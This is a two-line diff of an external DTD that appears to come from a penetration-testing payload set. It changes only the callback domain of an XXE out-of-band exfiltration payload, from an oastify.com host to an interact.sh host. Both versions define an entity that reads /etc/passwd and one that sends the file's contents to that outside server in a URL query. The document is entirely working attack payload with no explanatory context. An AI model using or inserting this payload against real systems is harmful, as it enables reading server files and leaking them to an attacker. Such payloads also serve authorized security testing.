@@ -1,2 +1,2 @@
 <!ENTITY % data SYSTEM "/etc/passwd">
-<!ENTITY % final "<!ENTITY exfil SYSTEM 'http://vyxnsedl7br6lhti2xjeomsfs6y0mp.oastify.com/?d=%data;'>">
+<!ENTITY % final "<!ENTITY exfil SYSTEM 'http://cba3ppa2vtc0000ss6e0gfib5mcyyyyyb.interact.sh/?d=%data;'>">
